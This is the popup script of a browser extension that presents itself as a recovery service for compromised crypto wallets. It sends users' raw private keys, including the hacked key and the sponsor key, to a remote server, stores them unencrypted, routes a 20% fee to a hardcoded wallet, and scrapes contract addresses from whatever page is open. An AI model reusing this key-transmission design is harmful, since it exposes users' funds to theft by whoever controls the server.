// SweepGuard Extension - Popup Script
// Handles UI interactions and communicates with background/content scripts

const API_BASE = 'https://sweeptsguard.vercel.app';
const FEE_WALLET = '0x7A3725154a2E6468F9549334394802e9E2822C2A';
const FEE_PERCENT = 20;

// State
let selectedChain = 1;
let selectedFeeMode = 'medium';
let gasPrices = {};
let wallets = {
  hackedKey: '',
  safeWallet: '',
  sponsorKey: ''
};

// Gas fee multipliers
const FEE_MULTIPLIERS = {
  slow: 0.8,      // 80% of base
  medium: 1.0,    // 100% of base
  aggressive: 1.5 // 150% of base
};

// Chain-specific gas settings
const CHAIN_GAS = {
  1: { name: 'Ethereum', symbol: 'ETH', avgGas: 30, unit: 'Gwei' },
  8453: { name: 'Base', symbol: 'ETH', avgGas: 0.001, unit: 'Gwei' },
  56: { name: 'BSC', symbol: 'BNB', avgGas: 3, unit: 'Gwei' },
  42161: { name: 'Arbitrum', symbol: 'ETH', avgGas: 0.1, unit: 'Gwei' },
  137: { name: 'Polygon', symbol: 'MATIC', avgGas: 50, unit: 'Gwei' },
  10: { name: 'Optimism', symbol: 'ETH', avgGas: 0.01, unit: 'Gwei' },
  43114: { name: 'Avalanche', symbol: 'AVAX', avgGas: 25, unit: 'nAVAX' },
  250: { name: 'Fantom', symbol: 'FTM', avgGas: 100, unit: 'Gwei' },
  81457: { name: 'Blast', symbol: 'ETH', avgGas: 0.001, unit: 'Gwei' },
  324: { name: 'zkSync', symbol: 'ETH', avgGas: 0.1, unit: 'Gwei' },
  59144: { name: 'Linea', symbol: 'ETH', avgGas: 0.1, unit: 'Gwei' },
  25: { name: 'Cronos', symbol: 'CRO', avgGas: 5000, unit: 'Gwei' }
};

// Initialize
document.addEventListener('DOMContentLoaded', async () => {
  await loadSavedData();
  setupTabs();
  setupChainGrid();
  setupFeeModeGrid();
  setupButtons();
  setupToggles();
  await fetchGasPrices(selectedChain);
});

// Load saved wallet data from storage
async function loadSavedData() {
  try {
    const result = await chrome.storage.local.get(['wallets', 'settings']);
    if (result.wallets) {
      wallets = result.wallets;
      document.getElementById('hackedKey').value = wallets.hackedKey || '';
      document.getElementById('safeWallet').value = wallets.safeWallet || '';
      document.getElementById('sponsorKey').value = wallets.sponsorKey || '';
    }
  } catch (e) {
    console.log('No saved data');
  }
}

// Tab switching
function setupTabs() {
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
      
      tab.classList.add('active');
      document.getElementById(`tab-${tab.dataset.tab}`).classList.add('active');
    });
  });
}

// Chain grid selection
function setupChainGrid() {
  document.querySelectorAll('.chain-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('selected'));
      btn.classList.add('selected');
      selectedChain = parseInt(btn.dataset.chain);
      fetchGasPrices(selectedChain);
    });
  });
}

// Fee mode grid selection
function setupFeeModeGrid() {
  document.querySelectorAll('.fee-mode-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.fee-mode-btn').forEach(b => b.classList.remove('selected'));
      btn.classList.add('selected');
      selectedFeeMode = btn.dataset.mode;
      updateFeeDisplay();
    });
  });
}

// Fetch gas prices from API
async function fetchGasPrices(chainId) {
  try {
    const response = await fetch(`${API_BASE}/api/gas?chainId=${chainId}`);
    const data = await response.json();
    
    if (data.gasPrices) {
      gasPrices = data.gasPrices;
      updateFeeDisplay();
    } else {
      // Use chain defaults
      const chain = CHAIN_GAS[chainId];
      if (chain) {
        gasPrices = {
          slow: chain.avgGas * 0.8,
          medium: chain.avgGas,
          aggressive: chain.avgGas * 1.5
        };
        updateFeeDisplay();
      }
    }
  } catch (e) {
    console.log('Using default gas prices');
    // Use chain defaults
    const chain = CHAIN_GAS[chainId];
    if (chain) {
      gasPrices = {
        slow: chain.avgGas * 0.8,
        medium: chain.avgGas,
        aggressive: chain.avgGas * 1.5
      };
      updateFeeDisplay();
    }
  }
}

// Update fee display
function updateFeeDisplay() {
  const chain = CHAIN_GAS[selectedChain];
  if (!chain) return;

  const slowPrice = gasPrices.slow || chain.avgGas * 0.8;
  const mediumPrice = gasPrices.medium || chain.avgGas;
  const aggressivePrice = gasPrices.aggressive || chain.avgGas * 1.5;

  // Update price displays
  document.getElementById('feeSlow').textContent = `${slowPrice.toFixed(4)} ${chain.unit}`;
  document.getElementById('feeMedium').textContent = `${mediumPrice.toFixed(4)} ${chain.unit}`;
  document.getElementById('feeAggressive').textContent = `${aggressivePrice.toFixed(4)} ${chain.unit}`;

  // Calculate estimated cost (200k gas limit)
  const gasLimit = 200000;
  let selectedPrice;
  
  switch (selectedFeeMode) {
    case 'slow':
      selectedPrice = slowPrice;
      break;
    case 'medium':
      selectedPrice = mediumPrice;
      break;
    case 'aggressive':
      selectedPrice = aggressivePrice;
      break;
    default:
      selectedPrice = mediumPrice;
  }

  // Convert to ETH/native currency
  let costInEth;
  if (chain.unit === 'Gwei') {
    costInEth = (selectedPrice * gasLimit) / 1e9;
  } else if (chain.unit === 'nAVAX') {
    costInEth = (selectedPrice * gasLimit) / 1e9;
  } else {
    costInEth = (selectedPrice * gasLimit) / 1e18;
  }

  // Update info displays
  document.getElementById('estimatedCost').textContent = `~${costInEth.toFixed(6)} ${chain.symbol}`;
  document.getElementById('baseFee').textContent = `${(selectedPrice * 0.7).toFixed(4)} ${chain.unit}`;
  document.getElementById('priorityFee').textContent = `${(selectedPrice * 0.3).toFixed(4)} ${chain.unit}`;
}

// Button handlers
function setupButtons() {
  // Claim button
  document.getElementById('claimBtn').addEventListener('click', handleClaim);
  
  // Transfer button
  document.getElementById('transferBtn').addEventListener('click', handleTransfer);
  
  // NFT button
  document.getElementById('nftBtn').addEventListener('click', handleNFT);
  
  // Save button
  document.getElementById('saveBtn').addEventListener('click', saveConfig);
  
  // Clear button
  document.getElementById('clearBtn').addEventListener('click', clearConfig);
}

// Toggle handlers
function setupToggles() {
  document.querySelectorAll('.toggle').forEach(toggle => {
    toggle.addEventListener('click', () => {
      toggle.classList.toggle('active');
    });
  });
}

// Handle claim
async function handleClaim() {
  const hackedKey = document.getElementById('hackedKey').value;
  const safeWallet = document.getElementById('safeWallet').value;
  const sponsorKey = document.getElementById('sponsorKey').value;
  
  if (!hackedKey || !safeWallet || !sponsorKey) {
    showResult('claimResults', 'error', 'Please fill all wallet fields');
    return;
  }
  
  const btn = document.getElementById('claimBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="loading"></span> Claiming...';
  
  try {
    // Get current page URL to detect claim contract
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    
    // Inject content script to detect claim page
    const results = await chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: detectClaimPage
    });
    
    if (results && results[0] && results[0].result) {
      const claimInfo = results[0].result;
      
      // Call SweepGuard API
      const response = await fetch(`${API_BASE}/api/airdrop/claim`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contractAddress: claimInfo.contract,
          chainId: selectedChain,
          claimMethod: claimInfo.method || 'claim',
          eligibleAddress: claimInfo.address,
          recipientAddress: safeWallet,
          privateKey: sponsorKey,
          tokenAddress: claimInfo.token,
          useFeeCollector: true,
          mode: 'claimFromAnyWallet',
          feeMode: selectedFeeMode,
          gasPrice: gasPrices[selectedFeeMode] || gasPrices.medium
        })
      });
      
      const data = await response.json();
      
      if (data.results && data.results[0]?.success) {
        showResult('claimResults', 'success', 
          `Claimed! TX: ${data.results[0].txHash?.slice(0, 16)}...`,
          `80% → ${safeWallet.slice(0, 8)}... | 20% → Fee Wallet`
        );
      } else {
        showResult('claimResults', 'error', data.error || 'Claim failed');
      }
    } else {
      showResult('claimResults', 'error', 'No claim page detected on this site');
    }
  } catch (e) {
    showResult('claimResults', 'error', e.message);
  }
  
  btn.disabled = false;
  btn.innerHTML = '🎯 Claim Airdrop — 80% to Safe Wallet';
}

// Detect claim page (injected into page)
function detectClaimPage() {
  // Look for common airdrop claim patterns
  const pageText = document.body.innerText.toLowerCase();
  const hasClaim = pageText.includes('claim') || pageText.includes('airdrop');
  
  // Try to find claim contract address
  const addressRegex = /0x[a-fA-F0-9]{40}/g;
  const addresses = document.body.innerText.match(addressRegex) || [];
  
  if (hasClaim && addresses.length > 0) {
    return {
      detected: true,
      contract: addresses[0],
      method: 'claim',
      address: addresses[1] || addresses[0],
      token: addresses[2] || null
    };
  }
  
  return null;
}

// Handle transfer
async function handleTransfer() {
  const hackedKey = document.getElementById('hackedKey').value;
  const safeWallet = document.getElementById('safeWallet').value;
  const sponsorKey = document.getElementById('sponsorKey').value;
  const tokenAddress = document.getElementById('tokenAddress').value;
  const amount = document.getElementById('transferAmount').value;
  
  if (!hackedKey || !safeWallet || !sponsorKey) {
    showResult('transferResults', 'error', 'Please fill all wallet fields in Claim tab');
    return;
  }
  
  const btn = document.getElementById('transferBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="loading"></span> Transferring...';
  
  try {
    const response = await fetch(`${API_BASE}/api/recover`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'recover',
        privateKey: hackedKey,
        safeAddress: safeWallet,
        sponsorPrivateKey: sponsorKey,
        chainId: selectedChain,
        tokenAddress: tokenAddress || undefined,
        amount: amount || 'all',
        feeMode: selectedFeeMode,
        gasPrice: gasPrices[selectedFeeMode] || gasPrices.medium
      })
    });
    
    const data = await response.json();
    
    if (data.success) {
      showResult('transferResults', 'success',
        `Transfer complete! TX: ${data.txHashes?.[0]?.slice(0, 16)}...`,
        `Tokens sent to ${safeWallet.slice(0, 8)}...`
      );
    } else {
      showResult('transferResults', 'error', data.error || 'Transfer failed');
    }
  } catch (e) {
    showResult('transferResults', 'error', e.message);
  }
  
  btn.disabled = false;
  btn.innerHTML = '💸 Transfer to Safe Wallet';
}

// Handle NFT claim
async function handleNFT() {
  const hackedKey = document.getElementById('hackedKey').value;
  const sponsorKey = document.getElementById('sponsorKey').value;
  const nftContract = document.getElementById('nftContract').value;
  const nftRecipient = document.getElementById('nftRecipient').value;
  
  if (!hackedKey || !sponsorKey || !nftContract || !nftRecipient) {
    showResult('nftResults', 'error', 'Please fill all fields');
    return;
  }
  
  const btn = document.getElementById('nftBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="loading"></span> Claiming NFT...';
  
  try {
    const response = await fetch(`${API_BASE}/api/recover`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'recover',
        privateKey: hackedKey,
        safeAddress: nftRecipient,
        sponsorPrivateKey: sponsorKey,
        chainId: selectedChain,
        nftContract: nftContract,
        isNFT: true,
        feeMode: selectedFeeMode,
        gasPrice: gasPrices[selectedFeeMode] || gasPrices.medium
      })
    });
    
    const data = await response.json();
    
    if (data.success) {
      showResult('nftResults', 'success',
        `NFT claimed! TX: ${data.txHashes?.[0]?.slice(0, 16)}...`,
        `NFT sent to ${nftRecipient.slice(0, 8)}... (0% fee)`
      );
    } else {
      showResult('nftResults', 'error', data.error || 'NFT claim failed');
    }
  } catch (e) {
    showResult('nftResults', 'error', e.message);
  }
  
  btn.disabled = false;
  btn.innerHTML = '🖼️ Claim NFT to Safe Wallet';
}

// Save configuration
async function saveConfig() {
  wallets = {
    hackedKey: document.getElementById('hackedKey').value,
    safeWallet: document.getElementById('safeWallet').value,
    sponsorKey: document.getElementById('sponsorKey').value
  };
  
  await chrome.storage.local.set({ wallets });
  showNotification('Configuration saved!');
}

// Clear configuration
async function clearConfig() {
  await chrome.storage.local.clear();
  
  document.getElementById('hackedKey').value = '';
  document.getElementById('safeWallet').value = '';
  document.getElementById('sponsorKey').value = '';
  
  wallets = { hackedKey: '', safeWallet: '', sponsorKey: '' };
  showNotification('All data cleared');
}

// Show result
function showResult(containerId, type, message, details) {
  const container = document.getElementById(containerId);
  container.innerHTML = `
    <div class="result-item ${type}">
      <div class="result-header">
        <span class="result-chain">${type === 'success' ? '✅' : '❌'} ${message}</span>
        <span class="result-status ${type}">${type}</span>
      </div>
      ${details ? `<div class="result-tx">${details}</div>` : ''}
    </div>
  `;
}

// Show notification
function showNotification(message) {
  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title: 'SweepGuard',
    message: message
  });
}
